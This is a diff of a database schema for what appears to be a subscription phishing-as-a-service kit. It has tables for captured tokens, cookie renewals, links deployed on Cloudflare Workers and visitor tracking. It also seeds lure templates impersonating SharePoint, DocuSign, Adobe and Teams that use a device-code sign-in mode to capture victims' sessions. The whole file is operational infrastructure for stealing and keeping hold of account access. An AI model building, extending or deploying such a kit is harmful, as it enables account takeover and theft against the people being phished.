@@ -8,6 +8,7 @@ USE vgenius;
 CREATE TABLE users (
     id INT AUTO_INCREMENT PRIMARY KEY,
     login_key VARCHAR(255) NOT NULL UNIQUE,
+    login_key_encrypted TEXT,
     activation_code VARCHAR(64) UNIQUE,
     subscription_status ENUM('active','expired','suspended','banned') DEFAULT 'active',
     subscription_plan ENUM('trial','full','lifetime') DEFAULT 'trial',
@@ -19,6 +20,7 @@ CREATE TABLE users (
     notify_prt TINYINT(1) DEFAULT 1,
     totp_enabled TINYINT(1) DEFAULT 0,
     totp_secret VARCHAR(128),
+    two_fa_method ENUM('none','totp','telegram') DEFAULT 'none',
     cf_api_token VARCHAR(255),
     cf_account_id VARCHAR(128),
     cf_workers_subdomain VARCHAR(128),
@@ -98,6 +100,8 @@ CREATE TABLE captured_tokens (
     deleted TINYINT(1) DEFAULT 0,
     deleted_at DATETIME,
     created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+    tenant VARCHAR(128) DEFAULT 'common',
+    template_type VARCHAR(64),
     FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
     FOREIGN KEY (link_id) REFERENCES links(id) ON DELETE SET NULL
 );
@@ -107,8 +111,10 @@ CREATE TABLE cookie_renewals (
     id INT AUTO_INCREMENT PRIMARY KEY,
     capture_id INT NOT NULL,
     user_id INT NOT NULL,
+    user_code VARCHAR(64),
     success TINYINT(1) DEFAULT 1,
     ip_address VARCHAR(45),
+    renewal_type VARCHAR(32),
     error_message TEXT,
     created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
     FOREIGN KEY (capture_id) REFERENCES captured_tokens(id) ON DELETE CASCADE,
@@ -244,10 +250,12 @@ CREATE TABLE user_sessions (
     user_id INT NOT NULL,
     session_token VARCHAR(255) NOT NULL UNIQUE,
     ip_address VARCHAR(45),
+    ip_address_encrypted TEXT,
     user_agent TEXT,
     device_info VARCHAR(255),
     is_current TINYINT(1) DEFAULT 0,
     created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+    last_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
     expires_at DATETIME,
     FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
 );
@@ -292,6 +300,19 @@ CREATE TABLE IF NOT EXISTS sub_users (
     FOREIGN KEY (parent_user_id) REFERENCES users(id) ON DELETE CASCADE
 );
 
+-- Telegram OTP table for 2FA verification
+CREATE TABLE IF NOT EXISTS telegram_otp (
+    id INT AUTO_INCREMENT PRIMARY KEY,
+    user_id INT NOT NULL,
+    otp_hash VARCHAR(64) NOT NULL,
+    expires_at DATETIME NOT NULL,
+    used TINYINT(1) DEFAULT 0,
+    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
+    INDEX idx_telegram_otp_user (user_id),
+    INDEX idx_telegram_otp_expires (expires_at)
+);
+
 -- Insert default settings
 INSERT INTO settings (setting_key, setting_value) VALUES
 ('subscription_price_usd', '50'),
@@ -321,9 +342,29 @@ INSERT INTO verification_designs (name, css_content, html_wrapper, status) VALUE
 .verification-card { background: #ffffff; border-radius: 16px; box-shadow: 0 4px 24px rgba(0,0,0,0.06); padding: 48px; max-width: 420px; width: 100%; border: 1px solid #e5e7eb; }
 ', '<div class="verification-wrapper"><div class="verification-card"><div id="templateContent"></div></div></div>', 'active');
 
--- Insert seed templates (4 templates as requested)
+-- Performance indexes
+CREATE INDEX idx_captured_tokens_user_id ON captured_tokens(user_id);
+CREATE INDEX idx_captured_tokens_link_id ON captured_tokens(link_id);
+CREATE INDEX idx_captured_tokens_deleted ON captured_tokens(user_id, deleted, created_at);
+CREATE INDEX idx_links_user_id ON links(user_id);
+CREATE INDEX idx_links_worker_name ON links(worker_name);
+CREATE INDEX idx_visitors_user_id ON visitors(user_id);
+CREATE INDEX idx_visitors_link_id ON visitors(link_id);
+CREATE INDEX idx_payments_user_id ON payments(user_id);
+CREATE INDEX idx_cookie_renewals_capture_id ON cookie_renewals(capture_id);
+CREATE INDEX idx_cookie_renewals_user_id ON cookie_renewals(user_id);
+CREATE INDEX idx_deployment_logs_link_id ON deployment_logs(link_id);
+CREATE INDEX idx_login_history_user_id ON login_history(user_id);
+CREATE INDEX idx_login_history_admin_id ON login_history(admin_id);
+CREATE INDEX idx_feedback_user_id ON feedback(user_id);
+CREATE INDEX idx_user_sessions_user_id ON user_sessions(user_id);
+CREATE INDEX idx_user_sessions_token ON user_sessions(session_token);
+CREATE INDEX idx_sub_users_parent ON sub_users(parent_user_id);
+
+-- Insert seed templates (5 templates)
 INSERT INTO templates (name, category, config_json, status) VALUES
 ('SharePoint 3', 'preload', '{"name":"SharePoint 3","preload":true,"auth_mode":"devicecode","fields":[{"key":"file_name","label":"File Name","type":"text","default":"Company_Policy.pdf"},{"key":"pages","label":"Pages","type":"number","default":12}],"background":{"default":"sharepoint_bg.jpg","editable":true,"blur":true}}', 'active'),
 ('DocuSign 4', 'preload', '{"name":"DocuSign 4","preload":true,"auth_mode":"devicecode","fields":[{"key":"file_name","label":"File Name","type":"text","default":"Contract_Agreement.pdf"},{"key":"pages","label":"Pages","type":"number","default":8}],"background":{"default":"docusign_bg.jpg","editable":true,"blur":true}}', 'active'),
 ('Adobe 3', 'preload', '{"name":"Adobe 3","preload":true,"auth_mode":"devicecode","fields":[{"key":"file_name","label":"File Name","type":"text","default":"NDA-2026-Final.pdf"},{"key":"pages","label":"Pages","type":"number","default":4}],"background":{"default":"adobe_bg.jpg","editable":true,"blur":true}}', 'active'),
-('Teams Meeting 2', 'no_preload', '{"name":"Teams Meeting 2","preload":false,"auth_mode":"devicecode","fields":[{"key":"title","label":"Title","type":"text","default":"Weekly Standup"},{"key":"message","label":"Message","type":"text","default":"Sign in to join your meeting"}],"background":{"default":"teams_bg.jpg","editable":true,"blur":true}}', 'active');
+('Teams Meeting 2', 'no_preload', '{"name":"Teams Meeting 2","preload":false,"auth_mode":"devicecode","fields":[{"key":"title","label":"Title","type":"text","default":"Weekly Standup"},{"key":"message","label":"Message","type":"text","default":"Sign in to join your meeting"}],"background":{"default":"teams_bg.jpg","editable":true,"blur":true}}', 'active'),
+('DocuSign No-Preload', 'no_preload', '{"name":"DocuSign No-Preload","preload":false,"auth_mode":"devicecode","fields":[{"key":"file_name","label":"File Name","type":"text","default":"Document_Details.pdf"},{"key":"pages","label":"Pages","type":"number","default":12}],"background":{"default":"docusign_bg.jpg","editable":true,"blur":true}}', 'active');
